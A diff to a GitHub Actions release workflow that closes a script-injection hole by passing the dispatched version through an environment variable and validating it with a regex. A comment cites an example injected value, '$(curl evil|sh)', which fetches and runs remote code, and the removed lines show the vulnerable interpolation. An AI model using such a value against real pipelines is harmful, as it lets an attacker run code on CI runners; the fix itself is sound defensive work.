@@ -48,14 +48,25 @@ jobs:
 
       - name: Resolve version
         id: v
+        env:
+          # Never interpolate a workflow input straight into a run: block. The
+          # expression is substituted as text before the shell parses it, so a
+          # dispatch value like $(curl evil|sh) would execute on the runner.
+          VERSION_INPUT: ${{ inputs.version }}
         run: |
           set -euo pipefail
           if [[ "${GITHUB_REF_TYPE}" == "tag" ]]; then
             version="${GITHUB_REF_NAME}"
-          elif [[ -n "${{ inputs.version }}" ]]; then
-            version="${{ inputs.version }}"
+          elif [[ -n "${VERSION_INPUT}" ]]; then
+            version="${VERSION_INPUT}"
           else
             version="v0.0.0-dev.$(git rev-parse --short HEAD)"
+          fi
+          # A version reaches tag names, file names and release titles. Pin its
+          # shape rather than trusting whatever was dispatched.
+          if [[ ! "$version" =~ ^v[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]]; then
+            echo "::error::refusing to build an unrecognised version: ${version}"
+            exit 1
           fi
           echo "version=${version}" >> "$GITHUB_OUTPUT"
           echo "bare=${version#v}" >> "$GITHUB_OUTPUT"
@@ -115,14 +126,19 @@ jobs:
       - name: Create or update the release
         env:
           GH_TOKEN: ${{ github.token }}
+          VERSION_INPUT: ${{ inputs.version }}
         run: |
           set -euo pipefail
           if [[ "${GITHUB_REF_TYPE}" == "tag" ]]; then
             version="${GITHUB_REF_NAME}"
           else
-            version="${{ inputs.version }}"
+            version="${VERSION_INPUT}"
           fi
           [[ -n "$version" ]] || { echo "no version to publish" >&2; exit 1; }
+          if [[ ! "$version" =~ ^v[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$ ]]; then
+            echo "::error::refusing to publish an unrecognised version: ${version}"
+            exit 1
+          fi
 
           mapfile -t assets < <(find dist -type f | sort)
           if gh release view "$version" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
